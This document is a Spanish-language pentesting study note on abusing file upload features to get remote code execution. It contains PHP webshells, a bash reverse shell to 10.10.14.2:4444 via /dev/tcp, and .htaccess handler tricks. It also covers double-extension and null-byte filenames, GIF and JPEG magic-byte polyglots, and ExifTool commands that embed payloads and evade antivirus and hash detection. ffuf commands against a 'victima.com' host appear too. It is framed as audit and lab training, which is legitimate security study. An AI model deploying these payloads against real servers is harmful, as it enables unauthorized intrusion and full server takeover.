##  📚 **Índice**

- [[#🔥 1. Introducción práctica al File Upload Abuse]]
- [[#📤 2. Cómo funciona realmente la subida de archivos]]
- [[#🧠 3. Mentalidad del atacante (qué buscamos y por qué)]]
- [[#💥 4. Casos de uso reales de explotación]]
- [[#🚀 5. Payloads clásicos y actuales para RCE]]
- [[#🛡️ 6. Restricciones comunes y cómo eludirlas]]
    - [[#🎭 6.1 Validación por extensión]]
    - [[#🎨 6.2 Validación por MIME type]]
    - [[#🧬 6.3 Validación por Magic Bytes]]
    - [[#📦 6.4 Validación por tamaño del archivo]]
    - [[#🔐 6.5 Validación por nombre o regex]]
    - [[#🧱 6.6 Validación lado cliente vs lado servidor]]
- [[#🌀 7. Técnicas ofensivas avanzadas]]
    - [[#🧨 7.1 Extensiones alternativas de PHP]]
    - [[#🔁 7.2 Doble extensión (.jpg.php)]]
    - [[#🗂️ 7.3 Bypass con .htaccess (AddType)]]
    - [[#🌀 7.4 Upload + Fuzzing para encontrar la ruta]]
    - [[#🔍 7.5 Hash guessing (MD5/SHA1 de nombres)]]
    - [[#🧬 7.6 Vector de ataque: Manipulación de metadatos con ExifTool]]
- [[#🧪 8. Uso real de Burp Suite (Repeater + Intruder)]]
- [[#🐳 9. Laboratorio práctico en Docker]]
- [[#🎯 10. Checklists PRO para auditorías]]
- [[#📎 11. Recursos adicionales]] 

---

# 🔥 **1. Introducción práctica al File Upload Abuse**

El abuso de subida de archivos ocurre cuando una aplicación permite que un usuario cargue un archivo en el servidor… **y no valida correctamente su contenido o tipo**.

El resultado más común:

> **RCE (Remote Code Execution)**  
> Cuando subes un archivo interpretado (ej: PHP) y el servidor lo ejecuta.

Ejemplos típicos:

- Foto de perfil
    
- Comprobante PDF
    
- Uploads de documentos
    
- Archivos adjuntos en tickets de soporte
    

Si no hay sanitización fuerte → **el atacante convierte el upload en una puerta trasera**.

---

# 📤 **2. Cómo funciona realmente la subida de archivos**

1. Usuario envía `multipart/form-data`.
    
2. El servidor:
    
    - Recibe el archivo
        
    - Decide dónde guardarlo
        
    - Opcionalmente renombra el archivo
        
    - Opcionalmente valida extension, contenido, tamaño…
        

Si cualquiera de estos pasos falla → **exploit**.

---

# 🧠 **3. Mentalidad del atacante (qué buscamos y por qué)**

### Objetivos ofensivos reales:

- 🧨 Subir un archivo ejecutable (PHP, JSP, ASPX)
    
- 🎭 Engañar la extensión (falsificación)
    
- 🧬 Manipular magic bytes
    
- 🔁 Hacer doble extensión
    
- 🗂️ Forzar interpretación mediante `.htaccess`
    
- 🔎 Averiguar dónde se almacena el archivo
    
- 🌀 Fuzzear rutas hasta encontrar el archivo subido
    
- 📤 Usar Burp para modificar cabeceras, tamaño y MIME
    

Esto es **lo que hacen los atacantes reales**.

---

# 💥 **4. Casos de uso reales de explotación**

### ✔️ RCE directa con PHP

Subes:

```php
<?php system($_GET['cmd']); ?>
```

Y lo llamas:

```
/uploads/avatar.php?cmd=id
```

### ✔️ RCE con .htaccess

Subes:

```
AddType application/x-httpd-php .rasta
```

Luego subes:

```
shell.rasta
```

Y el servidor lo interpreta como PHP.

### ✔️ Bypass con doble extensión

```
foto.jpg.php
```

Si la regex solo busca `.jpg` → bypass.

### ✔️ Magic bytes falsos

Si la app valida magic bytes:

```
GIF8;
<?php system($_GET['cmd']); ?>
```

El servidor cree que es un GIF → pero PHP lo ejecuta igual si llega al intérprete.

---

# 🚀 **5. Payloads clásicos y actuales para RCE**

### PHP Webshell básico:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

### Reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'"); ?>
```

### One-liner minimalista:

```
<?=`$_GET[0]`?>
```

Este bypass suele saltar restricciones de tamaño.

---

# 🛡️ **6. Restricciones comunes y cómo eludirlas**

## 🎭 **6.1 Validación por extensión**

Si server bloquea `.php` → prueba extensiones alternativas:

- `.php3`
    
- `.php4`
    
- `.php5`
    
- `.phtml`
    
- `.phar`
    
- `.inc`
    

## 🎨 **6.2 Validación por MIME type**

Si espera `image/jpg`, simplemente lo cambias en Burp:

```
Content-Type: image/jpg
```

## 🧬 **6.3 Validación por Magic Bytes**

Si esperan GIF:

Colocas al principio:

```
GIF8;
```

Y luego código PHP.

## 📦 **6.4 Validación por tamaño del archivo**

Cuando hay límite bajo:

Payload tiny:

```
<?=`$_GET[0]`?>
```

## 🔐 **6.5 Validación por nombre o regex**

Si regex busca `.jpg`, haces:

```
avatar.jpg.php
```

## 🧱 **6.6 Validación lado cliente vs lado servidor**

Si validan extensión con JavaScript:

- Abres DevTools
    
- Editas input `accept="image/*"`
    
- Subes cualquier archivo → bypass total
    

---

# 🌀 **7. Técnicas ofensivas avanzadas**

## 🧨 **7.1 Extensiones alternativas de PHP**

Muchos servidores permiten:

- `.php5`
    
- `.pht`
    
- `.phtml`
    
- `.phps`
    
- `.phar`
    

## 🔁 **7.2 Doble extensión**

```
shell.jpg%00.php   (null-byte)
shell.png.php
shell.gif.phtml
```

## 🗂️ **7.3 Bypass con .htaccess**

Archivo `.htaccess` mal protegido:

```
AddType application/x-httpd-php .evil
AddHandler php-script .rasta
```

Ahora cualquier archivo `.rasta` se ejecuta como PHP.

## 🌀 **7.4 Upload + Fuzzing para encontrar la ruta**

Si no sabes dónde quedó tu archivo:

```
ffuf -u https://victima.com/FUZZ/shell.php -w dirs.txt
```

O fuzz de MD5:

```
ffuf -w hashlist.txt -u https://victima.com/uploads/FUZZ.php
```

## 🔍 **7.5 Hash guessing (MD5/SHA1 de nombres)**

Si guardan:

```
md5(nombre_original).php
sha1(archivo).php
```

Puedes calcular:

```
echo -n "avatar.php" | md5sum
```

Y probar URLs.


# 🧬 **7.6 Vector de ataque: Manipulación de metadatos con ExifTool**

La mayoría de las aplicaciones que validan imágenes lo hacen revisando:

- El **Content-Type** enviado por el cliente
    
- Los **Magic Bytes** del inicio del archivo
    
- El **formato interno EXIF**
    
- El **filename**
    
- O combinaciones débiles de lo anterior
    

Pero hay un punto **crítico**:

> Muchas apps leen los **metadatos** para verificar que el archivo es realmente una imagen.

Y aquí es donde ExifTool se convierte en un arma ofensiva PERFECTA.

---

## 🧨 **¿Por qué funciona este ataque?**

Porque ExifTool permite:

- Cambiar **metadata interna** de un archivo
    
- Incrustar **payloads** en secciones EXIF que algunas librerías procesan incorrectamente
    
- Alterar magic bytes sin romper la estructura
    
- Crear imágenes híbridas (valen como imagen pero también contienen código ejecutable)
    
- Engañar validadores débiles del backend
    

Muchos frameworks asumen:

> “Si ExifTool dice que es una imagen válida, entonces es segura.”

Y tú lo usas en su contra.

---

# 🔧 **Uso ofensivo de ExifTool**

## ✔️ **1. Insertar código dentro de metadatos EXIF**

Ejemplo: insertar un webshell en la etiqueta “Comment” o “UserComment”:

```bash
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" avatar.jpg
```

Esto produce una imagen _perfectamente visible_, pero con un payload interno incrustado.

Dependiendo del backend, tienes vectores como:

- El servidor reescribe el archivo combinando EXIF → se ejecuta el payload
    
- La app utiliza herramientas como ImageMagick → vulnerable a **ImageTragick**
    
- Parsers EXIF defectuosos ejecutan comandos al leer metadatos
    

---

## ✔️ **2. Cambiar el MIME reportado en metadatos**

Algunas apps comprueban el MIME dentro del EXIF.  
Con ExifTool puedes falsificarlo:

```bash
exiftool -MIMEType=image/gif shell.php
```

Resultado:  
**Tu archivo PHP ahora se “autodeclara” como GIF.**

Si el servidor solo confía en MIME interno → bypass.

---

## ✔️ **3. Crear imagen híbrida “GIF+PHP” sin romperla**

Modificas magic bytes pero también incrustas el payload en EXIF:

```bash
exiftool -Comment="<?php echo shell_exec($_GET['cmd']); ?>" maldita.gif
```

Y luego:

```bash
printf "GIF8;" | cat - maldita.gif > final.gif
```

Tienes:

- GIF válido
    
- Payload escondido
    
- Magic bytes válidos
    
- Posible interpretación de PHP si el servidor no separa parsing
    

---

## ✔️ **4. Cambiar el software, modelo o formato EXIF para evadir validadores**

Ejemplos:

```bash
exiftool -Software="Adobe Photoshop" avatar.gif
exiftool -EXIF:Make="Canon" avatar.gif
exiftool -EXIF:Model="EOS 80D" avatar.gif
```

¿Para qué sirve esto?

- Para evadir validaciones estrictas que revisan metadatos
    
- Para evitar filtros anti-malware que detectan archivos sin metadata estándar
    
- Para que la imagen parezca “genuina”
    

---

## ✔️ **5. Añadir bytes adicionales en metadatos EXIF (polimorfismo)**

Algunas apps comparan hashes o patrones exactos.  
Tú rompes el patrón agregando datos:

```bash
exiftool -Artist="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" archivo.jpg
```

O incluso:

```bash
exiftool -Artist="$(head -c 500 /dev/urandom | base64)" archivo.jpg
```

Esto produce **variantes infinitas**, útil para:

- Bypass de antivirus
    
- Bypass de firmwares
    
- Bypass de detección basada en hashes
    

---

# 🚀 **Explotación Práctica con ExifTool + File Upload**

## **Caso real común (y muy explotable)**

1. La app solo permite subir imágenes (`.jpg`, `.png`, `.gif`).
    
2. Valida magic bytes.
    
3. Valida MIME.
    

Entonces tú:

1. Tomas `shell.php`
    
2. Lo conviertes en “foto”:
    

```bash
exiftool -MIMEType=image/jpeg shell.php
```

3. Le agregas magic bytes válidos:
    

```
FF D8 FF E0  (JPEG SOI)
```

4. O lo combinas con:
    

```
printf "\xFF\xD8\xFF\xE0" | cat - shell.php > shell.jpg
```

5. ExifTool corrige automáticamente metadatos inconsistentes → la imagen pasa el filtro.
    

Pero el contenido después de los primeros bytes sigue siendo **PHP ejecutable**.

---

# ☣️ **Bonus: Casos donde ExifTool da RCE directo**

ExifTool en versiones antiguas tuvo **vulnerabilidades críticas** donde procesar un archivo maligno podía dar RCE en el servidor.  
Esto es útil cuando:

- La app usa ExifTool para “sanitizar” imágenes
    
- El atacante sube un archivo diseñado para explotar ExifTool
    

Payloads de ImageTragick, GhostScript y ExifTool son usados **en cadena** con File Upload.

---

# 🎯 **Conclusión del Vector ExifTool**

Manipular EXIF con ExifTool te permite:

- Crear archivos híbridos (imagen + código)
    
- Falsificar MIME
    
- Alterar magic bytes
    
- Insertar payloads invisibles
    
- Evasión de validadores
    
- Evasión de antivirus
    
- Engañar a aplicaciones mal configuradas
    
- Revertir sanitización automática
    

Este vector es **real**, **utilizado**, y **extremadamente poderoso**.


---

# 🧪 **8. Uso real de Burp Suite (Repeater + Intruder)**

### Para subir el archivo malicioso:

1. Capturas petición
    
2. Cambias:
    
    - `filename="shell.php"`
        
    - `Content-Type`
        
    - `boundary` si hace falta
        
3. Envías al Repeater para verificar
    
4. Fuszeas restricciones con Intruder:
    

- MIME type
    
- Magic bytes
    
- Extensiones
    
- Regex bypass
    
- Tamaño
    

---

# 🐳 **9. Laboratorio práctico en Docker**

Repositorio:

[https://github.com/moeinfatehi/file_upload_vulnerability_scenarios](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios)

Te permite practicar:

- Upload sin validación
    
- Validación por MIME
    
- Validación por extensión
    
- Validación por magic bytes
    
- Validación por tamaño
    
- Doble extensión
    
- Upload de .htaccess
    
- Upload + guess ruta
    

---

# 🎯 **10. Checklists PRO para auditorías**

### ✔ Antes de subir el payload:

- ¿Qué tipo de archivo espera la app?
    
- ¿Qué validación hace el lado cliente?
    
- ¿Qué validación hace el lado servidor?
    
- ¿Renombra el archivo?
    
- ¿Dónde almacena el archivo?
    

### ✔ Después de subir:

- ¿Puedes acceder al archivo?
    
- ¿El servidor lo ejecuta?
    
- ¿Filtra magic bytes?
    
- ¿Rechaza extensiones alternativas?
    

### ✔ Fases ofensivas:

- Probar extensiones alternativas
    
- Probar doble extensión
    
- Probar .htaccess
    
- Validar magic bytes
    
- Ver si hay bypass de MIME
    
- Ver si hay bypass de tamaño
    
- Fuzzear rutas
    
- Fuzzear nombre (hashes)
    

---

# 📎 **11. Recursos adicionales**

- File Upload Lab  
    [https://github.com/moeinfatehi/file_upload_vulnerability_scenarios](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios)
    
- Payload All The Things — File Upload  
    [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload)
    
- HackTricks — File Upload  
    [https://book.hacktricks.wiki/en/pentesting-web/file-upload/](https://book.hacktricks.wiki/en/pentesting-web/file-upload/)
    
- SecLists — Upload payloads  
    `/usr/share/seclists/Payloads/File-Upload/`
    

---

